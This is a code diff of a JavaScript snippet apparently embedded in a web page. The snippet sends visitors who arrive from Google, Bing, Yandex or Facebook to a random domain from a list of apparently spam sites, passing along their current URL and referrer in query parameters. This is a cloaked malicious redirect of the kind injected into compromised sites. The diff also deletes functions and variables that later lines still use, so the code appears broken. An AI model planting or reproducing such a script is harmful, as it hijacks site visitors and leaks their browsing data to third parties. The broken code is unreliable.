@@ -1,14 +1,15 @@
 //<![CDATA[
-    var go_current      = window.location.href;
-    var reff        	= document.referrer;
-    
-    function rChoice(arr) {
-      return arr[Math.floor(arr.length * Math.random())];
-  }
-     var ars             = rChoice([
+    if(document.referrer)
+    {
+        var cek = document.referrer;
+
+        var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.');
+
+      if(is_se)
+        var ars             = rChoice([
                             "https://seoclick.org",
                             "https://sumba.club",
-			    "https://oneorbit.xyz",
+                            "https://oneorbit.xyz",
                             "https://chiarafans.club",
                             "https://aziekitchen.xyz",
                             "https://berita-islami.me",
@@ -23,5 +24,6 @@
         //==> ARSAE DIRECT
         go_current            = ars + '/?arsae='+ encodeURIComponent(go_current) + '&arsae_ref='+ encodeURIComponent(reff);
     }
-
+    }
 //]]>
+ 
